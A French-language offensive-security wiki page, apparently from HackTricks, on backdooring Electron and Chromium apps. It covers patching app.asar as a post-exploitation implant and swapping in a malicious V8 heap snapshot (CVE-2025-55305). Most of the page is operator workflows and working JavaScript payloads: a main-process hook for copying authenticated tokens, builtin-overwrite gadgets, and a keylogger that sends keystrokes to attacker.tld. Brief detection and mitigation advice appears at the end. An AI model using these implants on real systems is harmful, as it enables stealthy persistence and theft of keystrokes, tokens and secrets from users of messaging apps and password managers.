# Injection de code locale dans Electron et falsification des snapshots

{{#include ../../banners/hacktricks-training.md}}

## Injection de code locale dans Electron

Si vous pouvez modifier ou instrumenter une application Electron installée localement, vous pourrez peut-être lui faire exécuter du JavaScript arbitraire. Voir :


{{#ref}}
../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-electron-applications-injection.md
{{#endref}}

Pour une interface de débogage locale de Node inspector ou de Chromium DevTools, voir [Node inspector/CEF debug abuse](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

## Post-exploitation : implants ASAR/processus principal

Si vous obtenez un **accès en écriture** au répertoire de ressources d’une application Electron, une méthode de post-exploitation très pratique consiste à **patcher `app.asar`** (ou le point d’entrée JS qu’il charge), puis à attendre que l’utilisateur relance l’application. Contrairement à un XSS limité au renderer, le code chargé depuis le **processus principal** s’exécute dans le **runtime Node.js** de l’application : il peut donc généralement accéder au **système de fichiers**, lancer des commandes, intercepter les API Electron et inspecter l’état authentifié de l’application.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Workflow typique :

1. Extraire `app.asar` et identifier le véritable fichier d’amorçage à partir de `package.json` (`main`) ou de la logique de démarrage existante.
2. Ajouter un petit loader au **processus principal** (ou un hook de preload/processus principal), puis recompresser l’archive.
3. Attendre le prochain démarrage de l’application et utiliser l’implant pour capturer les données d’exécution après que l’utilisateur a déverrouillé l’application de bureau ou s’y est authentifié.

Exemple minimal de patch d’amorçage :

```javascript
// Added near the application main entrypoint
const cp = require("child_process")
const { session } = require("electron")

session.defaultSession.webRequest.onBeforeSendHeaders((details, callback) => {
  // Inspect or copy authenticated headers/tokens here
  callback({ requestHeaders: details.requestHeaders })
})

cp.exec("id")
```

Implications pratiques :

- **Vol de données d’un client de confiance** : une fois que l’application de bureau déchiffre ou charge les données de l’utilisateur, l’implant peut les lire depuis le runtime. C’est pourquoi les **clients de messagerie E2EE** (Signal/Slack/Mattermost) et les **coffres-forts/gestionnaires de secrets** restent des cibles intéressantes au niveau du terminal.
- **Abus de session/de jetons** : les implants Electron peuvent voler les cookies de l’application, les jetons bearer, les en-têtes de requête, les fichiers de workspace ou les identifiants de dépôt accessibles au client en cours d’exécution (par exemple, les extensions VS Code authentifiées ou les intégrations Git).
- **Pivot dans le contexte de la victime** : une application modifiée peut acheminer les requêtes via le poste de travail de la victime, en réutilisant son adresse IP, son empreinte TLS et sa session applicative, au lieu de se limiter à exfiltrer des jetons bruts.

> [!NOTE]
> Si la cible active **ASAR integrity** / **OnlyLoadAppFromAsar** ou les **fuses** renforcés d’Electron, vous devrez peut-être utiliser une autre primitive locale de chargement de code (par exemple, l’abus de fuse ou le snapshot tampering). Consultez la page d’injection spécifique à macOS pour découvrir d’autres options d’implant local et obtenir des détails sur les fuses.

## Backdoor locale par altération d’un snapshot de heap V8 (Electron/Chromium) – CVE-2025-55305

Les applications basées sur Electron et Chromium désérialisent au démarrage un snapshot de heap V8 préconstruit (v8_context_snapshot.bin et, éventuellement, browser_v8_context_snapshot.bin) afin d’initialiser chaque isolate V8 (main, preload, renderer). Historiquement, les fuses d’intégrité d’Electron ne considéraient pas ces snapshots comme du contenu exécutable ; ils échappaient donc à la fois à la vérification d’intégrité fondée sur les fuses et aux contrôles de signature de code du système d’exploitation. Par conséquent, remplacer le snapshot dans un répertoire d’installation accessible en écriture à l’utilisateur permettait une exécution de code furtive et persistante au sein de l’application, sans modifier les binaires signés ni l’ASAR.<sup>[[2]](#references)</sup>

Points clés
- Lacune d’intégrité : EnableEmbeddedAsarIntegrityValidation et OnlyLoadAppFromAsar valident le JavaScript de l’application dans l’ASAR, mais ne couvraient pas les snapshots de heap V8 (CVE-2025-55305). Chromium ne vérifie pas non plus l’intégrité des snapshots.<sup>[[3]](#references)[[4]](#references)</sup>
- Prérequis de l’attaque : accès en écriture local au répertoire d’installation de l’application. C’est courant sur les systèmes où les applications Electron ou les navigateurs Chromium sont installés dans des chemins accessibles en écriture à l’utilisateur (par exemple, %AppData%\Local sous Windows ; /Applications avec certaines réserves sous macOS).
- Effet : exécution fiable du JavaScript de l’attaquant dans n’importe quel isolate en écrasant un builtin fréquemment utilisé (un « gadget »), ce qui permet la persistance et le contournement de la vérification de signature de code.
- Surface affectée : applications Electron (même avec les fuses activés) et navigateurs basés sur Chromium qui chargent leurs snapshots depuis des emplacements accessibles en écriture à l’utilisateur.

Générer un snapshot malveillant sans compiler Chromium
- Utilisez le electron/mksnapshot précompilé pour compiler un payload JS dans un snapshot et remplacer le v8_context_snapshot.bin de l’application.<sup>[[5]](#references)[[6]](#references)</sup>

Exemple de payload minimal (prouver l’exécution en provoquant un crash)
```js
// Build snapshot from this payload
// npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
// Replace the application’s v8_context_snapshot.bin with the generated file

const orig = Array.isArray;

// Use Array.isArray as a ubiquitous gadget
Array.isArray = function () {
  // Executed whenever the app calls Array.isArray
  throw new Error("testing isArray gadget");
};
```

Routage de payload tenant compte des isolates (exécuter du code différent dans le processus principal et le renderer)
- Détection du processus principal : les globals propres à Node, comme process.pid, process.binding() ou process.dlopen, sont présents dans l’isolate du processus principal.
- Détection du navigateur/renderer : les globals propres au navigateur, comme alert, sont disponibles dans un contexte de document.

Exemple de gadget qui sonde une fois les capacités Node du processus principal
```js
const orig = Array.isArray;

Array.isArray = function() {
  // Defer until we land in main (has Node process)
  try {
    if (!process || !process.pid) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  // Run once
  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    console.log('[payload] isArray hook started ...');

    // Capability probing in main
    console.log(`[payload] unconstrained fetch available: [${fetch ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained fs available: [${process.binding('fs') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained spawn available: [${process.binding('spawn_sync') ? 'y' : 'n'}]`);
    console.log(`[payload] unconstrained dlopen available: [${process.dlopen ? 'y' : 'n'}]`);
    process.exit(0);
  }
  return orig(...arguments);
};
```

PoC de vol de données depuis le contexte renderer/navigateur (p. ex., Slack)
```js
const orig = Array.isArray;
Array.isArray = function() {
  // Wait for a browser context
  try {
    if (!alert) {
      return orig(...arguments);
    }
  } catch (_) {
    return orig(...arguments);
  }

  if (!globalThis._invoke_lock) {
    globalThis._invoke_lock = true;
    setInterval(() => {
      window.onkeydown = (e) => {
        fetch('http://attacker.tld/keylogger?q=' + encodeURIComponent(e.key), {mode: 'no-cors'})
      }
    }, 1000);
  }
  return orig(...arguments);
};
```

Flux de travail de l’opérateur
1) Écrivez payload.js pour écraser un builtin courant (p. ex., Array.isArray) et, éventuellement, différencier le comportement selon l’isolate.
2) Créez le snapshot sans les sources de Chromium :
   - npx -y electron-mksnapshot@37.2.6 "/abs/path/to/payload.js"
3) Remplacez le ou les fichiers snapshot de l’application cible :
   - v8_context_snapshot.bin (toujours utilisé)
   - browser_v8_context_snapshot.bin (si le fuse LoadBrowserProcessSpecificV8Snapshot est utilisé)
4) Lancez l’application ; le gadget s’exécute dès que le builtin choisi est utilisé.

Remarques et considérations
- Contournement des contrôles d’intégrité et de signature : les fichiers snapshot ne sont pas considérés comme des exécutables natifs par les contrôles de signature de code et, historiquement, n’étaient pas couverts par les fuses d’Electron ni par les contrôles d’intégrité de Chromium.
- Persistance : le remplacement du snapshot dans une installation accessible en écriture à l’utilisateur survit généralement aux redémarrages de l’application et donne l’apparence d’une application légitime signée.
- Navigateurs Chromium : le même principe de falsification s’applique à Chrome et à ses dérivés installés dans des emplacements accessibles en écriture à l’utilisateur. Chrome dispose d’autres mesures d’intégrité, mais exclut explicitement les attaques physiquement locales de son modèle de menace.<sup>[[9]](#references)[[10]](#references)</sup>

Détection et mesures d’atténuation
- Traitez les snapshots comme du contenu exécutable et incluez-les dans les mécanismes d’application de l’intégrité (correctif CVE-2025-55305).
- Privilégiez les emplacements d’installation accessibles en écriture uniquement aux administrateurs ; établissez une référence et surveillez les hachages de v8_context_snapshot.bin et browser_v8_context_snapshot.bin.
- Détectez l’écrasement précoce de builtins et les modifications inattendues des snapshots ; déclenchez une alerte lorsque les snapshots désérialisés ne correspondent pas aux valeurs attendues.

## References

- [1] [JS-Tap v3 : post-exploitation des terminaux avec des implants JavaScript](https://trustedsec.com/blog/js-tap-v3-endpoint-post-exploitation-with-javascript-implants)
- [2] [Comment contourner les contrôles d’intégrité du code pour installer une porte dérobée locale dans Signal, 1Password, Slack et d’autres applications](https://blog.trailofbits.com/2025/09/03/subverting-code-integrity-checks-to-locally-backdoor-signal-1password-slack-and-more/)
- [3] [Fuses d’Electron](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [4] [Intégrité ASAR d’Electron](https://www.electronjs.org/docs/latest/tutorial/asar-integrity)
- [5] [Snapshots de démarrage personnalisés de V8](https://v8.dev/blog/custom-startup-snapshots)
- [6] [electron/mksnapshot](https://github.com/electron/mksnapshot)
- [7] [MITRE ATT&CK T1218.015](https://attack.mitre.org/techniques/T1218/015/)
- [8] [Loki C2](https://github.com/boku7/Loki/)
- [9] [Chromium : désactiver le chargement de code non signé (CIG)](https://chromium.googlesource.com/chromium/src/+/refs/heads/lkgr/docs/design/sandbox.md#disable-loading-of-unsigned-code-cig)
- [10] [FAQ de sécurité de Chrome : les attaques physiquement locales sont hors périmètre](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/faq.md#why-arent-physically_local-attacks-in-chromes-threat-model)
{{#include ../../banners/hacktricks-training.md}}
